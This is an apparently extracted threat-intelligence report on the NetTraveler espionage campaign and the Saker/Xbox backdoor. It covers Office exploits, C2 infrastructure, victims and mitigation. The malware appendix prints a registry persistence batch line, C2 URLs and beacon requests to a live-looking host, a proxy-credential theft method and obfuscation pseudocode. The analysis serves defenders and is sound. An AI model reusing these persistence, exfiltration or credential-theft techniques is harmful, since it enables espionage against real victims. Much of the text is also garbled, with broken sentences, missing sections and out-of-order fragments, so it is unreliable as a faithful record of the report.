1. execuTive Summary

this report describes multiple cyber-espionage 
campaigns  that  have  successfully  compro-
mised more than 350 high profile victims in 40 
countries. the focus of the paper is to describe 
nettraveler, which is the main tool used by the 
threat actors during these attacks.

 the name “nettraveler” comes from an internal 
string which is present in early versions of the 
malware: “nettraveler is running!”. this mal-
ware is used by APt actors for basic surveillance 
of their victims. earliest known samples have a 
timestamp of 2005, although references exist 
indicating activity as early as 2004. the largest 
number of samples we observed were created 
between 2010 and 2013.

 Known targets of nettraveler (also known as 
‘travnet’ or “netfile”) include tibetan/uyghur 
activists, oil industry companies, scientific re-
search  centers  and  institutes,  universities, 
private companies, governments and govern-
mental institutions, embassies and military con-
tractors.

the nettraveler backdoor is often used together 
with other malware families. during the anal-
ysis of one of the command and control (c&c) 

servers, we observed how the attackers de-
ployed different backdoors to the victims’ ma-
chines. these include the malware known as 
“saker” also known as “xbox” (known filenames: 
“update.exe”, “updata.exe” or “xbox.exe”) and 
“Pcrat” / ”Zegost”. this report includes a full 
description of the “saker/xbox” backdoor as 
well.

 the attacks use spear-phishing e-mails with 
malicious microsoft office documents as attach-
ments. Gathered data includes file system list-
ings, keylogs, various types of documents (.doc, 
.xls, .ppt, .pdf, etc...) and other private informa-
tion. We have calculated the amount of stolen 
data stored on c&c servers to be 22+ gigabytes. 
however this data represents only a small frac-
tion which we managed to see - the rest of the 
it had been previously downloaded and deleted 
from the c&c servers by the attackers.

nettraveler victims get infected through spear-phishing attacks using office documents 
which exploit two publicly known vulnerabilities -- cVe-2012-0158 and cVe-2010-3333. 
Although these vulnerabilities have been patched by microsoft, they remain effective and 
are among the most exploited in targeted attacks.

during our analysis, we did not see any advanced use of zero-day vulnerabilities or other 
malware techniques such as rootkits. it is therefore surprising to observe that such un-
sophisticated attacks can still be successful with high profile targets.

this spear-phish targeted cVe-2010-3333, 
a very popular vulnerability exploited in many 
attacks. the development of this version of 
the exploit delivers a large, easily identified 
“0x4141” noP sled prior to its shellcode, shed-
ding some light on the immaturity of the devel-
opment behind the effort. more interesting is 

that the target in india received this file titled 
“Army cyber security Policy 2013.doc”, and 
the accompanying benign and empty decoy 
Word document is dropped to the temp folder 
and opened with Word as “Jallianwala bagh 
massacre a deeply shameful act.doc” (md5:

2.3 installed malware, functionality, 

Persistence

 nettraveler is an automatic data exfiltration tool, designed to extract large amounts 
of private information from the victim’s system over long periods of time. the malware 
uses compression techniques and a fail-safe protocol to ensure that uploaded data is 
safely transferred to the attacker’s c2s.

 by default, nettraveler exfiltrates common file 
types such as doc, xls, PPt, rtF and PdF. For 
a full list, see the detailed backdoor analysis 
below. the backdoor configuration can however 
be extended with special options to steal other 
file types. here’s one such extended configura-
tion recovered from an attack against a victim 
working in the oil industry:

it is clear that the attackers are also collecting 
files of type “.cdr” (corel draw designs), “.dwg”, 
“.dxf”, “.cdw”, “.dwf” (AutocAd projects) and 
some configuration files “.cfn” and “.cfg”.

 the various parameters of the malware are con-
figured with a builder, which allows the attackers 
to change things such as the list of stolen files 
extensions, c2 address and so on:

2.4 exfiltrated data

exfiltrated data is encoded with a custom compression and encoding library, which pro-
duces files which resemble bAse64. the data is transferred to the command and control 
servers via httP requests such as:

2.5 overla P with red

2.6 connections with 

other camPaigns

note: for our analysis of the red october cam-
paign, see: https://www.securelist.com/en/
blog/785/the_red_october_campaign_An_
Advanced_cyber_espionage_network_target-
ing_diplomatic_and_Government_Agencies

during our analysis of nettraveler infections, 
we identified several victims that were infected 
both by nettraveler and red october. Although 
we see no direct links between the nettraveler 
attackers and the red october threat actor, the 
existence of victims infected by both of these 
campaigns is interesting.

these victims are:

 > A military contractor in russia
 > An embassy in iran
 > An embassy in belgium
 > An embassy in Kazakhstan
 > An embassy in belarus
 > A Government entity in tajikistan

these infections indicate that certain high profile 
victims are targeted by multiple threat actors; 
the target information is a valuable commodity.

to better identify core nettraveler actors and 
delineate the groups from one another, we 
collect and categorize various tactics, tech-
niques, and Procedures (ttPs) employed by 
these adversaries throughout their operations. 
the attacker’s iP operation ranges, overlaps 
with that of a malware family known as “Ze-
gost”. For instance, one of the command and 
control servers that is part of the infrastruc-
ture, is a well-known c2 for multiple Zegost 
variants, still active as of may 2013. the tar-
gets and command and control domain naming 
scheme indicates a connection between the 
lurid/enfal attackers and nettraveler. some 
of the nettraveler c2’s are used to distribute 
a malware known as “saker” or “xbox”, which 
is delivered as an “update” to the nettraveler 
victims.

note: more details about the connections 
between nettraveler and other campaigns 
is available in our private report. contact 
us at intelreports@kaspersky.com for more 
details.

ServerS aND iNfraSTrucTure

during our monitoring period, we observed more than 100 command and control urls, 
pointing to multiple servers in the united states, china and hong Kong.

 the command and control servers generally run 
iis 6/7, as the c2 backend is an AsP (microsoft 
Active server Pages) script.

to transfer stolen data from the command and 
control servers, the attackers use FtP on top 
of VPn connections through a server in the us 
hosted by Krypt technologies. the infrastructure 
is secured by allowing FtP access only to remote 
users coming from predefined iPs, including the 
VPn provider in the us.

during our investigation, we analyzed several 
hundred nettraveler samples and configuration 
files, which use more than 30 different c&c serv-
ers. the list below includes the script names that 
we have seen on these servers and confirmed 
as malicious:

aasogspread.asp,  adfsdfclnggsldfc.asp, 

advertisingservicesa3sb.asp,  aneywsf.

form the same basic functions - for a description 
of the supported functionality, see below.

3. commAnd And control serVers And inFrAstructure

 3.1 descriP tion of c2 scriP t functionality

the main function of command and control servers is to collect stolen data from the 
victims. stolen data is stored in the exact format it was sent from the victim’s Pc, without 
any additional encoding or obfuscation.

 here’s a listing of how a folder storing stolen victim data could look on the c&c server:

the uploaded data can be either a document file, a keylogger backlog or a system infor-
mation profile. here’s how a decoded system information profile looks like:

 

 

 15

system profile, filename is of the form ‘@@@dll@@@travlerbackinfo-[date/time].bak’

the system profile includes an iPconFiG output as well as a list of user accounts in the 
machine. if the malware install includes the “netPass” module, a keylogger will silently 
collect all typed data, together with window names. this produces logs like the following 
(in decoded format):

3. commAnd And control serVers And inFrAstructure

the command and control scripts implement several functions to communicate with the 
victim; during our analysis, we observed four different generations of these scripts, with 
various degrees of complexity. the main function of the c&c script saves stolen data to 
a folder in the c2 root, unless the request variable “action” is defined, in which case, it 
performs one of the following commands:

command 
“action”)

Purpose

downloaded

same as “updated” command

downloadsize, 
updatesize

same as datasize

the command and control scripts reply to the 
victim with either “success:<size>” or “Fail!”, de-
pending on the result of the operation. in some 
cases, instead of the “Fail” string, a more de-
tailed error is sent back to the victim, in simpli-
fied chinese:

under normal operation, a victim can connect 
to the c2 every five seconds and upload chunks 
of data from the victim, until the entire file is 
successfully transferred. in case of errors, the 
malware continues to send the data over and 
over, until they succeed.

“无法删除!” - means “can not be deleted!”
“该文件不存在!” - means “the file does not exist!”

4. Global iNfecTioN STaTiSTicS

during our analysis, we obtained infection logs from several command and control 
servers. the logs, which go back as far as 2009, show that the threat actors behind 
nettraveler successfully infected more than 350 victims in 40 countries. the following 
map shows the locations and profile of the victims:

in addition to the data from the command and

besides the c&c logs and Ksn, we have also 
sinkholed  two  of  the c&c  domains  used  by 
nettraveler:

 > yangdex.org

 the data set collected so far from the sinkhole 
is relatively small and includes victims in mon-
golia, south Korea and india. We will continue 
to monitor the connections and over time, up-
date this paper with more data as it becomes 
available.

Note: Taking into account that several other C&C 
servers exist for which we have no logs and the KSN 
coverage, we estimate the total number of victims 
worldwide to be around ~1,000.

5. miTiGaTioN iNformaTioN

From the point of view of the victims, the most 
important part of any report is information on 
how to detect and eradicate the infections. in 
addition to running a modern security suite ca-
pable of detecting nettraveler, things such as 
filenames or c2 iPs can be extremely useful to 
system administrators.

conclusions

coNcluSioNS:

during our analysis, we describe nettraveler, a 
malicious data exfiltration tool used by a me-
dium-sized threat actor group from china. the 
main targets of the group include government 
institutions, embassies, oil and gas industry, 
research institutes, universities, private com-
panies, military contractors and activists. the 
group’s domains of interest include space ex-
ploration, nanotechnology, energy production, 
nuclear power, lasers, medicine and communi-
cations between others.

Although not very advanced, the netttraveler 
attackers have successfully compromised hun-
dreds of targets around the world, with the high-
est number in mongolia, india and russia.

the group using nettraveler is also employing 
other malware, including Zegost, saker and oth-
ers. to compromise their victims, they rely on 
exploits for two popular vulnerabilities in mic-
rosoft office.

based on collected intelligence, we estimate the 
group size to about 50 individuals, most of which 
speak chinese natively and has knowledge of 
english language.

by publishing this report we would like to raise 
awareness of all organizations and individuals 
who might become a victim of these attackers. 
We would like to encourage people of all coun-
tries to learn something from this report, check 
their systems and be prepared for potential fu-
ture cyberattacks against them.

more information on attribution and victims will 
be available to selected parties, including lo-
cal authorities of victim countries. For details, 
please contact us at intelreports@kaspersky.

descriPtion

technicAl d etAils

the module is a Win32 Pe executable file com-
piled in microsoft Visual c++ 6.0. its main pur-
pose is to drop a dll file and register it as a sys-
tem service. the malware looks up a suitable 
service name from one of the values in the reg-
istry.

 this module also drops an ini-type file with the 
configuration that is later used by the nettrav-
eler backdoor.

execution of the module starts with the creation 
of a system mutex object called “instAll ser-
Vices noW!”. if this mutex already exists the 
module quits to avoid duplicate instances of the 
same module from running.

 After that, the module creates the configura-
tion file named %Windir%\system\config_t.dat 
which is populated with the strings embedded in 
the body of the executable and encrypted with 
simple one-byte xor (0x3e).

encrypted configuration data in the dropper

26

APPendix A: mAlWAre technicAl AnAlysis

the config_t.dat is an ini-type file which contains 
the module configuration shown below:

the purpose of Ps, PP, Pu, PW, PF parameters 
is the following:

[Option]
WebPage=hXXp://vip222idc.s169.288idc.com/nt12/
newyork/city/nettraveler.asp2
DownCmdTime=10
UploadRate=128
[Other]
UP=0
[OtherTwo]
AutoCheck=1
 
the WebPage parameter’s maximum length is 
128 bytes and represents a url for the com-
mand and control server (c&c). downcmdtime 
is the delay in minutes between requests sent 
to the c&c server.

the code of the function to dump the ini file 
is designed to process several cases. there is 
1 byte value for variable uP (which stands for 
“use Proxy”) from section [other]. if that value 
is set to 1 (absolute file offset 0x334) then the 
ini file section [other] will be populated with the 
following values:

[Other]
UP=1
PS=<string (max 32 bytes from offset 0x335)>
PP=<integer (2 bytes and positive from offset 0x355)>
PU=<string (max 32 bytes from offset 0x357)>
PW=<string (max 32 bytes from offset 0x377)>
PF=<integer (2 bytes and non-negative from offset 
0x397)>

 >  Ps = proxy server address
 > PP = proxy server port
 > Pu = proxy username
 > PW = proxy password
 > PF parameter purpose remains unclear.

 
the  module  then  queries  registry  value  at 
hklm\SofTWare\microsoft\Windows 
NT\\currentversion\Svchost\netsvcs which 
is a multi-string type of value. then it iterates 
through the names of services in that value to 
find a special service name. it must not be the 
“6to4” service and there must not be registry 
key hklm\SySTem\currentcontrolSet\Ser-
vices\<servicename>.

on Windows xP services that match the de-
scribed criterias are (eg.) “ias”,”iprip”, “irmon” 
and a few others. these names are different on 
other Windows os and even depend on installed 
features or service Packs. the malware takes 
the first matching service name and uses it.

right after that, the malware attempts to delete 
%WiNDir%\system32\<servicename>ex.
dll and registers a new system service with the 
same name <servicename>. the service is 
designed to be a Win32 shared process like 
svchost, autostarted by system service control 
manager during system boot. that creates cor-
responding system registry values in hklm\
SySTem\currentcontrolSet\Services\<ser-
vicename>.

 27

descriPtion

the malware is Win32 Pe dll file compiled in mi-
crosoft Visual c++ 6.0. it has one export function 
servicemain which has the main functionality of 
the module.

 this module has initial filename assigned during 
compilation: “dll.dll”.

technicAl d etAils

upon start the module sets corresponding ser-
vice status to “start_Pending” and then imme-
diately to “running”.

 it checks if system mutex named “NetTravler is 
running!” exists and terminates if that is true. 
note: other known mutexes used by variants of 
nettraveler include:

 > boat-12 is running!
 > dochunter2012 is running!
 > hunter-2012 is running!
 > nt-2012 is running!
 > nettravler is running!
 > nettravler2012 is running!
 > sh-2011 is running!
 > shenghai is running!

 
After that it opens %WiNDir%\system\con-
fig_t.dat file and parses the following values:

After that it saves to local directory and executes 
the following batch file (net.bat):

@echo off
@reg  add  “hkey_local_machiNe\SyS-
Tem\currentcontrolSet\Services\irmon\
parameters” /v ServiceDll /t reG_expaND_
SZ /d c:\WiNDoWS\system32\<servicen-
ame>ex.dll
 
note that <servicename> is replaced with the 
actual system service name that was previously 
found.

After  that  the  module  creates  the c:\WiN-
DoWS\system32\<servicename>ex.dll file 
on disk and sets hard-coded file creation and 
last access date and time to “20:00 17 august 
2004”.

the new file is then filled with data produced 
after decryption of the hard-coded data block.

 > pf (integer with default value: 10)

 
next the module prepares some strings for test-
ing the internet connection:

<modulename>.log

http://www.microsoft.com/info/privacy_se-
curity.htm (%testurl%)

 
if checkedSuccess value from ini file equals 0 or 
doesn’t exist, the module will fetch additional con-
figuration from the same ini file [other] section:

ironically, the %testurl% is a microsoft web 
page about privacy, security and safety online 
(last updated in January 2000):

 29

After that with the help of Wininet APi the mod-
ule issues an httP Get request to %testurl% 
(see above) and the following hardcoded httP 
header values:

User: <proxy username>
Pass: <proxy password>
<data from the URL>
///////////////////////////////////////////////

accept: image/gif, image/x-xbitmap, image/
jpeg, image/pjpeg, application/x-shock-
wave-flash, */*
accept-language: en-us
proxy-connection: keep-alive
pragma: no-cache
user-agent: mozilla/4.0 (compatible; mSie 
6.0)
 
it sets other options such as proxy server ad-
dress and port (Ps and PP values from ini file 
or attempts to find proxy settings automatical-
ly), proxy username and password (Pu and PW 
values from the ini file), several connection 
timeouts limited with 60 seconds.

 if the Ps, PP, Pu, PW parameters were not found 
the ini file or Autocheck value is set to 1, the 
module attempts to find local proxy settings ac-
cording to the procedure below.

finding Proxy 
configuration

 First, the module lists contents of %ProGrAm-
Files% directory and appends the listing to the 
log file.

the module submits the request and reads the 
response of the server. the response is stored 
in newly allocated memory block.

 then it opens ie history file of the current user 
(history.ie5\index.dat) parses it and appends 
the log with discovered logins/password saved 
in the the history file as a part of visited urls.

After that the malware appends debug output 
to the log file named <modulename>.log. the 
output messages are shown below:

method currect:
User: <current user name>
ProxyIP::
ProxyBypass::

30

 After that the module logs current version of 
internet explorer. interestingly that the log file is 
appended with the following hard coded string:

“ie版本: internet explorer “, 版本 means “ver-
sion” in simplified chinese.

APPendix A: mAlWAre technicAl AnAlysis

the module reads ie version from hKlm\soft-
ware\microsoft\internet explorer\Version reg-
istry value.

function (method 2) was probably merged with 
another one (method 3) in newer variant of the 
malware.

then it gets version of current os, and again 
appends the result to the log file with some hard 
coded strings in it:

“操作系统版本” which means “version of oper-
ating system” in simplified chinese.

the malware is capable of interpretation of sys-
tem minor/major code and recognizing the fol-
lowing o ses:

 > microsoft Windows 95
 > microsoft Windows 95 osr
 > microsoft Windows 98
 > microsoft Windows 98 se
 > microsoft Windows millennium edition
 > microsoft Windows nt
 > microsoft Windows 2000
 > microsoft Windows xP
 > microsoft Windows 2003
 > microsoft Windows Vista
 > microsoft Windows 7

 
it can also recognize type of os: Professional, 
server, Advanced server and exact version and 
build numbers are also appended to the log file.

method 1:

this is a straightforward attempt to connect to 
the test url, assuming that system-wide proxy 
settings are correct or no proxy is required to 
access the external website. the url for testing 
is http://www.microsoft.com/info/privacy_
security.htm with the following header values:

accept: image/gif, image/x-xbitmap, image/
jpeg,  image/pjpeg,  application/x-shock-
wave-flash, */*
accept-language: en-us
proxy-connection: keep-alive

if the method succeeds the module appends 
received data from the url to the log file and 
corresponding parameter is set in the ini file 
(uP=0).

if something fails the following message is ap-
pended to the log file: “method1 fail!!!!!”

there were four different methods to find proxy 
configuration on the system according to the log 
file messages set in three functions. one of the 

this method is used when the infected machine 
uses proxy server but the settings are not avail-
able for local system user. A user working at 

method 2 And method 3:

 31

the infected machine might have internet ac-
cess and should have the required proxy server 
settings.

the malware list all processes running on the 
machine and locates process named “exPlor-
er.exe”. this process is a system shell which is 
normally running after local user successfully 
authenticates and logs in to the system. the 
malware finds explorer process and obtains se-
curity token which is later used to temporarily 
impersonate as local user and get proxy con-
figuration with internetQueryoptionA(0,inter-
net_oPtion_Proxy,...) APi call.

if the result contains proxy settings the malware 
gets them. if for some reason local proxy set-
tings were not found in current user profile, the 
malware attempts to double-check and opens 
ie settings in the registry. the following registry 
values are checked:

hkcu\Software\microsoft\Windows\cur-
rentversion\internet Settings\proxyenable
hkcu\Software\microsoft\Windows\cur-
rentversion\internet Settings\proxyServer
hkcu\Software\microsoft\Windows\cur-
rentversion\internet Settings\proxyover-
ride

After that the malware first obtains the ie stored 
credentials. it iterates through all stored local 

user secrets via credenumerateA and looks for 
those which start with “microsoft_Wininet_” and 
contain the address of the proxy server previ-
ously obtained. these secrets are decrypted 
with cryptunprotectdata APi call. such call is 
possible only after impersonation as local user 
which is available for the malware running with 
local system privileges. this method checks the 
first available password in the list of passwords 
from the system stored secrets.

once the potential server, port, login and pass-
word are obtained the malware makes a test 
query to the same url: http://www.microsoft.
com/info/privacy_security.htm. if it succeeds 
the content of this page is appended to the log 
file with all details about the proxy server. if the 
method fails it prints the following line in the log 
file: “method3 fail!!!!!”

method 4:

this method is identical to method 3 with just 
one difference: it checks the last available pass-
word in the list of passwords from the system 
stored secrets.

method x (debuG ):

there is also an unused method in the code with 
no internal number, which was most likely used 
to debug the application as it writes all interme-
diate results to the log file, starting from string

if the malware failed to locate the proxy server it 
unregisters current malicious service by deleting 
corresponding registry keys in hklm\System\

tempts to delete all related files from the fol-
lowing list:

otherwise, if the proxy was checked successful-
ly the malware writes the following value to the 
config file (config_t.dat):

After that the module sleeps for 60 seconds and 
starts a new thread (see below thread1), sleeps 
10 more seconds and creates another thread 
(see below thread2). right after that it enters an 
infinite loop of doing nothing but sleeping which 
can be interrupted by a special value in global 
variable set by other threads. upon detecting 
this value the service routine ends which termi-
nates the service execution.

the module expects server to reply “success”. if 
it doesn’t the module will try again in 10 minutes.

if the server was notified and confirmed receiv-
ing the notification, the module reads stat_t.
ini file which is just another config in ini format:

this is clearly the functionality which lets the 
attacker download specific files or even full di-
rectories including all subdirectories contents 
basing on defined file search criterias, such as 
file extensions.

Filesystem s cAn

the malware has a file enumeration routine, 
which gets the settings from dnlist.ini (such as 
directory paths to process) and launches a re-
cursive directory search. the output is saved to 
enumfs.ini file in the following format:

[Computer]
Name=<Local system name>
Page=<Current Windows ANSI code page (ACP)>
[<Local system name>]
d1=<string>
d2=<string>
…
d<N>=<string>
dircount=<N>

f<M>=<string>
d1=<string>
d2=<string>
…
d<K>=<string>
dircount=<K>
filecount=<M>
[<d2 string>]
…

After execution, this log file contains directories 
with all filenames and subdirectories. only di-
rectory/file names are stored, with no addition-
al data such as timestamps or size. When the 
search is finished, the module saves current 
date to the dnlist.ini file and changes option 
scanAll, see format below. this is done to avoid 
recurrent scanning of the filesystem, which is 
normally a heavy process and might be noticed 
by local user or an administrator.

APPendix A: mAlWAre technicAl AnAlysis

After scanning the local filesystem, enumfs.
ini file is uploaded to the server via httP Get 
request described above (see the submission 
process of stat_t.ini file in the beginning of c&c 
communication part) with filename of the fol-
lowing format:

filelist-<month><Day>-<hour><minute> 
<Second>.ini

uPloAdinG Files

the next stage of this thread uploads files inter-
esting for the attacker to the c&c server. this 
process is described below.

the module works with files described in dnlist.
ini file. it gets a list of file extensions that must 
be uploaded to the c&c first. there is a default 
list of extensions (value Types of section [oth-
er]) that represent interest for the attackers: 
doc,docx,xls,xlsx,txt,rtf,pdf. then it gets file-
total values from [filelist] section of dnlist.ini 
and iterates through every f<N> value, where n 
is a positive integer starting from 1.

there are several tests applied to each file, be-
fore it is uploaded to the server, including the 
following:

if the file matches the criterias, then a unique 
file  state  identifier  for  that  file  is  created, 
which is an md5 hash of the following string: 
“<filename>  <year>-<month>-<Day> 
<hour>:<minute>:<Second>:<millisec-
onds>”. the date and time values in the string 
before are obtained from the file last change 
time.

After that the module creates a name used for 
uploading the file to the server, which consists 
of the following: “<year>-<month>-<Day>-
<hour>-<minute>-<file state identifier, the 
mD5>”. the time and date values are also taken 
from the file’s last change time. this file is up-
loaded to the c&c using the same procedure as 
used before for uploading other files.

After that, thread1 attempts to upload a file called 
uenumfs.ini, which is created by the thread2. the 
remote filename is set to the following “ufilel-
ist-<month><Day>-<hour><minute><Sec-
ond>.ini”.

next, the thread iterates through %Temp%\
ntvba00.tmp\ directory and uploads every file 
located there. the file names are preserved as 
they are.

 > File size must not be larger than ~10mb 

control Procedure

(10’485’760 bytes).

 > File must have one of the extensions from 

the “types” option.

then, the thread issues a special httP Get re-
quest to get next control instruction from the 
c&c. this is done by accessing the following uri:

 37

hXXp://vip222idc.s169.288idc.com/nt12/newyork/
city/nettraveler.asp?action=getdata (3)

server response is converted to uppercase and 
analyzed. there is defined set of responses ex-
pected from the c&c server:

 > %sysdir%\enumfs.ini
 > %sysdir%\dnlist.ini
 > %sysdir%\udidx.ini
 > %sysdir%\uenumfs.ini
 > %sysdir%\stat_t.ini

01. <botid>:uninstAll

04. <botid>:uPloAd

this command simply uninstalls the malicious 
service from the registry and deletes locally cre-
ated files.

02. <botid>:uPdAte

this procedure starts from uninstalling current 
service, then it issues three httP Get requests 
to the c&c script url:

this procedure is identical to the uPdAte com-
mand described before with one difference - no 
uninstallation of the current module is done, only 
new executable is downloaded and started. this 
method is probably used to execute additional 
independent malicious executable, unrelated 
to the original nettraveler malware. or it can 
be used to infect with the nettraveler backdoor 
configured for some other c&c server.

GET .../newyork/city/nettraveler.asp?action=data-
size to get the size of updated module that will 
be pushed with next request.

After processing any of the commands above 
the malware issues the following request to the 
server to confirm command execution:

GET .../newyork/city/../updata.exe to get the up-
dated module to be executed. this module is 
instantly saved to %Windir%\install.exe and 
executed.

03. <botid>:reset

this procedure simply removes all temporary 
files, such as the following:

GET .../newyork/city/nettraveler.asp?action=updat-
ed&hostid=<BotId>

if the server hasn’t issued the uninstAll com-
mand the thread continues execution starting 
from the beginning of the control loop (see 
above).

APPendix A: mAlWAre technicAl AnAlysis

threAd2 (driVe m onitorinG t hreAd)

this thread creates a hidden window with class 
name “NTmainWndclass” and processes win-
dow messages in a loop until it is interrupted by 
special variable value. the window procedure 
processes only one window message, Wm_De-
vicechaNGe with wParam value set to DbT_
Devicearrival, which is sent by the system 
when a new removable device such as usb flash 
drive or network shared folder is attached to 
the system.

the module will proceed only if the attached 
removable device has provided a disk volume. 
it is designed to have different procedures for 
removable disk drives from usb flash and net-
work shares.

the usb drives will be processed only if GSearch 
value is set to true in [other] section of dnlist.
ini file. similarly, a new network drive will be 
processed only if uSearch value is set to true 
in [other] section of dnlist.ini file.

uenumfs.ini file for writing. the latter is filled 
with directories and subdirectories listings of the 
attached disk drive. the format of the data in 
uenumfs.ini is almost identical to the one created 
during fixed drive filesystem scan (see “Filesys-
tem scan” part in thread1 description above).

in addition to that, the same criterias are applied 
to each file (size and file extension) as in fixed 
drive filesystem scan. Also, every file gets a state 
id calculated as md5 hash of the filename and 
timestamp of the last modification. this hash 
is used to generate a new filepath in the follow-
ing format: %Temp%\ntvba00.tmp\<year>-
<month>-<Day>-<hour>-<minute>-<file 
state id, mD5 hexadecimal string>.<original 
extension>. the source file from newly attached 
drive is then copied to the destination set by the 
generated file path. Please note, that the file orig-
inal extension is preserved, while the file name is 
changed. that is used to prevent further problems 
when working with unsupported encoding.

both network and removable usb drives are 
processed in the same procedure, which reads 
the following values from dnlist.ini file:

At the same time when file is copied to ntvba00.
tmp directory, a record is added to udxidx.ini 
file, which has the following format:

[Other]
UTypeLimit=<boolean, default True>
UAuto=<boolean, default False>
 
if uAuto option is set to true, the thread creates 
%Temp%\ntvba00.tmp\ directory and opens 

[Index]
<File state id, MD5 hexadecimal string>=1

this is done to avoid copying files that were al-
ready copied before, unless they were changed 
by the user.

 39

to avoid excessive use of the disk drive and oc-
casional interest of the local user, the file copy-
ing procedure has a delay. every 1000 files the 
thread delays execution and sleeps for 9 sec-
onds.

side notes
useless text transformation
in function which gets disk volume serial num-
ber the actual serial number is converted from a 
decimal integer to a hexadecimal number stored 
as an Ascii string. the integer is converted to 

a string with call to the “sprintf’ function and 
“%8x” parameter which outputs 8 characters 
representing a number in hexadecimal form. 
despite the fact that the output of this call is in 
uppercase, the author of the module converts 
the output to uppercase characters again. this 
could be due to the fact that the author used to 
have “%8x” format string before, which made 
such conversion rational. however, that clearly 
shows that the developer wasn’t aware of vari-
ous format strings options, which shows lack of 
experience in c/c++ development.

Drive monitoring disk processing issue
As we mentioned above the drive monitoring 
thread uses the same function to process 
removable usb drives and network shares 
attached as local drives. Visible separation of 
these two types of disk drives (in the name of 
the options Gsearch and usearch, where “u” 
probably stands for “usb” and “G” is for “Glob-
al”, and in separate logical branches of code 
flow) is later misused, as the drive processing 
routines is bound to usb drives. At least it read 
u-prefixed options from dnlist.ini file, which 
logically corresponds to the usb-type of disk 
drive, but used for both. While this is a minor 
issue and probably didn’t cause a serious 
problem for the attackers, this shows that the 
developer felt lazy at some point and used 
copy and Paste approach to avoid creating 
extra code. it could also mean that one part of 
the code was created by one person and later 
modified by another, who mistakenly over-
looked general code design.

Data decompression routine
the malware uses a custom data compres-
sion algorithm when uploading files to the 
c&c server. While the decompression is not 
required for the work of the application, the 
code for the decompression routine was also 
found in the malicious module. this clearly 
indicates a design flaw and shows that the de-
veloper didn’t review the code on a binary level 
after it was compiled, which is common among 
beginners among malware authors and quite 

widespread among common software develop-
ers. ‘saker’ (‘xbox’) dropper and loader

6.0 (msVc++ 6.0)

descriPtion

the module is non-packed Win32 Pe executable 
file compiled in microsoft Visual c++ 6.0. Al-
though no encryption or compression is used to 
protect or hide parts of the code, simple obfus-
cation is applied to internal strings. the module 
main purpose is to install and embedded dll file 
or load it during system startup.

technicAl d etAils

execution of the main function starts with ob-
taining local user startup directory. this path is 
appended with “\service.lnk”.

 41

the strings, which are used in the application are 
stored in simple obfuscated form. For example, 
the “Kaspersky lab” is stored as “K.sp4r6ky 
aa,”. the 1, 4, 6, 10 and 12 characters are re-
placed with hardcoded character constants as 
shown below:

iterating through %ProGrAmFiles% directory 
and looking for “kaspersky lab” subdirectory. if 
it finds Kaspersky products it quickly exits, if not 
it attempts to self-delete by running “cmd.exe /c 
del <moduleName>” and then exits.

then the module gets local %temP% folder path 
and constructs paths “%Temp%\service.dll” 
and “%Temp%\service.exe”.

After that the code checks if the current module 
file name is called “service.exe”.

if current module is not called “service.exe”, 
the module copies itself to “%tmP%\service.
exe” and creates corresponding lnK file in lo-
cal user’s startup folder pointing to the freshly 
created executable. the executable file is as-
signed an attribute “hidden” and started in a 
new process. then the module checks if Kasper-
sky products are installed on local system by 

if the module was already installed in the system 
and is called “service.exe”, it checks if system mu-
tex object called “SecuT!” already exists and exits 
if it’s true. this is done to avoid multiple instances 
of the module from running simultaneously.

After  that,  the  module  creates  a  new  file  at 
“%Temp%\service.dll” and saves a part of own 
data to the new file. the data offset is hardcoded 
as a string “46592”.

next, it attempts to load the “%temP%\service.
dll” library file and call export function named 
“JustTempfun”. After that the module enters 
an infinite sleep loop.

 6.0 (msVc++ 6.0)

descriPtion

the module is a non-packed Win32 dll exe-
cutable file compiled in microsoft Visual c++ 
6.0. Although no encryption or compression is 
used to protect or hide parts of the code, simple 
obfuscation is applied to internal strings. the 
module is to clearly a backdoor application that 
enables an attacker to manage files, get infor-
mation about local disk drives, download and 
start new executables. this backdoor is probably 
authored by the same developer who created the 
Gh0st / Zegost rAt.

technicAl d etAils

this module has 2 export functions: JustTemp-
fun and servicemain. module main function as 
well as servicemain are empty procedures. so 
far, all functionality of the module is located in 
JusttempFun function.

When this module is loaded with xbox loader 
described above execution is started with Just-
tempFun exported function. this function begins 
with deobfuscation of the strings used further:

pitgay.minidns.net
8090BBBBBBBBBBBB
GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG
SakerEvent
FFFFFFFFFFFFFFFF
Proxy
HHHHHHHHHHHHHHHH

obviously pitgay.minidns.net is the c&c server 
domain name. 8090 is the port the malware con-
nects to. As for the “GGG...”, “FFF...” and “hhh...” 
strings, according to the further code analysis 
they are used as a placeholders for the hardcode 
proxy settings:
the “FFF...” placeholder may contain “Proxy” 
string instead of “F” sequence which works as a 
flag to use the proxy settings from the “GGG...” 
placeholder in the form that wininet accepts 
(according to msdn, the format is “http=http://
http_proxy other”). the “hhh...” placeholder is 
for proxy username and password.

meanwhile, there is another known malicious 
dll which has exactly these export names - 
Gh0st rAt, that was also developed by chinese.

the thread collects information about the local 
system, such as
 > os version
 > cPu type

 43

 > used and available memory
 > local system name

this algorithm not only adds obfuscation but 
also adds some redundancy, which doubles the 
size of the input string.

drive c:\

the last value is converted to a hexstring of 8 
characters and xor-ed with current computer 
name. the purpose of this value is unclear.

then the information collected before is encrypt-
ed using simple string obfuscation algorithm, 
shown below in a pseudo code:

void ObfuscateString(char* strIn, char* strOut, int 
nLen)
{
char c;
for (i=0;i <nLen; i++)
{
c = strIn[i] % 32;
if(c <= 9)
strOut[2*i] = c+0x30;
else
strOut[2*i] = c+0x37;

if(strIn[i] <= 9)
strOut[2*i+1] = strIn[i]+0x30;
else
strOut[2*i+1] = strIn[i]+0x37;
}
}

44

the module attempts to connect to a c&c server 
and issue using the following url:

http://pitgay.minidns.net:8090/3010...

Also, it uses a hardcoded user-Agent string. 
there is not query string parameters, the data 
is transferred in a form of cGi path consisting of 
hex numbers only and prefixed with 3010, which 
makes such requests rather unique. 3010 most 
likely defines client request id. here is how a 
request may look:

GET /301000000000F0FD...0000000000000000000
000000 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win-
dows NT 5.0; .NET CLR 1.1.4322)
Host: tsgoogoo.net

Host: pitgay.minidns.net:8090
Cache-Control: no-cache

the module checks the server response code 
and if that is httP 200, it reads 2 dWord values 
(lets call them ParamA and Paramb) from the the 
server response.

the first dWord (ParamA) defines the command 
and following execution path. below is the inte-
ger values and commands description:

APPendix A: mAlWAre technicAl AnAlysis

1020: Shutdown
1021: Shutdown

both 1020 and 1021 commands are used to 
interrupt execution of the module and terminate 
the main thread. the module also sets local 
thread privileges to enable global system shut-
down, however this is not used later and proba-
bly represents some remains of the code written 
